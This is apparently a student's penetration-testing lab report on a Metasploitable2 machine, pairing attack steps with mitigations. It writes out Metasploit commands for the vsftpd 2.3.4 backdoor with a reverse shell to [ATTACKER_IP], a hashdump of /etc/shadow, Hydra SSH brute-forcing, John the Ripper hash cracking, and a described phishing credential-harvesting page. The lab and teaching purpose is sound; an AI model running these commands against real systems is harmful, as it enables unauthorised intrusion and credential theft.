
# Penetration Testing & System Security Report

This repository documents the steps taken to identify, exploit, and mitigate vulnerabilities in a controlled lab environment as part of the "Exploitation & System Security" module.

## 1\. Penetration Testing Methodology

The framework used for this assessment follows the standard penetration testing phases:

1.  **Reconnaissance:** Gathering initial information about the target (e.g., IP scanning, service discovery).
2.  **Scanning & Enumeration:** Actively scanning the target for open ports, services, and known vulnerabilities.
3.  **Exploitation:** Gaining unauthorized access by leveraging an identified vulnerability.
4.  **Post-Exploitation:** Establishing persistence, escalating privileges, and identifying sensitive data.
5.  **Reporting & Remediation:** Documenting all findings and providing clear steps for mitigation.

-----

## 2\. Task: Exploitation with Metasploit

**Objective:** To gain system access to the Metasploitable2 virtual machine by exploiting a known vulnerability.

### Exploitation Steps

1.  **Scanning:** The target (Metasploitable2) was first scanned using Nmap to identify open ports and services.

    ```bash
    nmap -sV [TARGET_IP]
    ```

      * **Finding:** A vulnerable service (e.g., `vsftpd 2.3.4`) was discovered running on port 21.
      * `[Insert screenshot of Nmap results]`

2.  **Exploit Identification:** The Metasploit Framework was used to find an exploit for this specific service version.

    ```bash
    msfconsole
    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```

3.  **Configuration:** The exploit payload was configured with the target (RHOSTS) and attacker (LHOST) IP addresses.

    ```bash
    set RHOSTS [TARGET_IP]
    set LHOST [ATTACKER_IP]
    show options
    ```

      * `[Insert screenshot of Metasploit options]`

4.  **Exploitation:** The exploit was executed, successfully opening a reverse shell to the target machine.

    ```bash
    exploit
    ```

      * `[Insert screenshot of the successful shell]`

5.  **Post-Exploitation:** Once system access was gained, basic commands were run to confirm access and gather information.

    ```bash
    whoami
    sysinfo
    hashdump
    ```

      * **Result:** Root access was confirmed. The `hashdump` command successfully extracted the password hashes from the `/etc/shadow` file.
      * `[Insert screenshot of hashdump output]`

### Mitigation Steps

  * **Patch Management:** The primary vulnerability exists because the service is outdated. The `vsftpd` service should be updated to the latest stable version that patches this backdoor vulnerability.
  * **Network Segmentation:** The FTP server should be isolated in a DMZ (Demilitarized Zone). Firewall rules should be configured to only allow access from trusted IP addresses, rather than being exposed to the entire network.
  * **Principle of Least Privilege:** The FTP service should not be running as the `root` user. It should run under a non-privileged service account to limit the damage an attacker can do if the service is compromised.

-----

## 3\. Task: Password Attacks

**Objective:** To demonstrate cracking weak credentials using brute-force and hash-cracking techniques.

### Part A: Brute-Force SSH (Hydra)

  * **Exploitation Steps:**

    1.  Hydra was used to perform a dictionary attack against the SSH service running on the target.
    2.  A common password list (`rockyou.txt`) was used to guess the password for a known user (e.g., `msfadmin`).

    <!-- end list -->

    ```bash
    hydra -l msfadmin -P /path/to/rockyou.txt [TARGET_IP] ssh
    ```

      * **Result:** The password was successfully cracked: `msfadmin:msfadmin`.
      * `[Insert screenshot of Hydra's successful result]`

  * **Mitigation Steps:**

      * **Strong Password Policy:** Enforce minimum password length, complexity (uppercase, lowercase, numbers, symbols), and rotation.
      * **Account Lockout:** Configure the system to lock an account for a set period (e.g., 15 minutes) after 3-5 failed login attempts.
      * **Intrusion Prevention:** Use a tool like **Fail2ban**, which actively monitors logs for failed login attempts and automatically updates firewall rules to block the attacker's IP address.
      * **Public Key Authentication:** Disable password-based authentication for SSH entirely and use only SSH keys, which are computationally infeasible to brute-force.

### Part B: Cracking Hashes (John the Ripper)

  * **Exploitation Steps:**

    1.  The hashes obtained from the Metasploit `hashdump` command were saved to a file (`hashes.txt`).
    2.  John the Ripper (JTR) was used with a wordlist to crack these hashes.

    <!-- end list -->

    ```bash
    john --wordlist=/path/to/rockyou.txt hashes.txt
    ```

      * **Result:** JTR successfully cracked several weak passwords from the hash file.
      * `[Insert screenshot of JTR output showing cracked passwords]`

  * **Mitigation Steps:**

      * **Strong Hashing Algorithm:** The target system was likely using an old, fast hashing algorithm like MD5 or SHA1. Systems should be configured to use a modern, slow, and salted hashing algorithm like **Argon2**, **scrypt**, or **bcrypt** to make cracking exponentially more difficult and time-consuming.
      * **Password Salting:** Ensure a unique, random "salt" is applied to every password before hashing. This prevents attackers from using pre-computed "rainbow tables."

-----

## 4\. Task: Social Engineering (Simulation)

**Objective:** To simulate a phishing attack to demonstrate the risk and test user awareness.

  * **Simulation Steps:**

    1.  A credential-harvesting webpage was designed to clone a legitimate login portal (e.g., a fake company email login).
    2.  A phishing email was crafted with a compelling pretext (e.g., "Urgent: IT Security Update Required") to lure users into clicking a link to the fake page.
    3.  *(Note: In a real simulation, this would be sent to consenting test users, and all collected data would be handled ethically.)*

  * **Detection & Mitigation:**

      * **User Training (Human Firewall):** This is the most critical defense. Users should be trained to:
          * Hover over links to inspect the true destination URL.
          * Be suspicious of emails that create a sense of urgency or fear.
          * Never enter credentials on a site they reached via an email link.
          * Report suspicious emails to the IT/Security department.
      * **Email Filtering:** Implement robust anti-spam and anti-phishing filters.
      * **DMARC, DKIM, and SPF:** Configure these email authentication standards to prevent email "spoofing," making it harder for attackers to impersonate your domain.
      * **Multi-Factor Authentication (MFA):** Even if an attacker steals a user's password, MFA prevents them from logging in without the second factor (e.g., a code from a phone app).

-----

## 5\. Task: System Hardening Checklist

Based on all vulnerabilities found, the following remediation steps should be applied to secure the system:

  * **[✅] Apply Security Patches:** Update all services (FTP, SSH, etc.) and the operating system kernel to the latest versions.
  * **[✅] Enforce Strong Passwords:** Implement a strong password policy and migrate from password authentication to key-based authentication for SSH.
  * **[✅] Configure Firewall:** Implement a default-deny firewall policy. Only open ports that are absolutely necessary for business functions (e.g., block port 21 if FTP is not needed).
  * **[✅] Disable Unused Services:** Any service that is not required (e.g., telnet) should be completely disabled and uninstalled to reduce the attack surface.
  * **[✅] Implement Monitoring:** Configure system logging and install tools like Fail2ban or an EDR to detect and respond to suspicious activity.
  * **[✅] Implement User Training:** Schedule regular security awareness training for all users.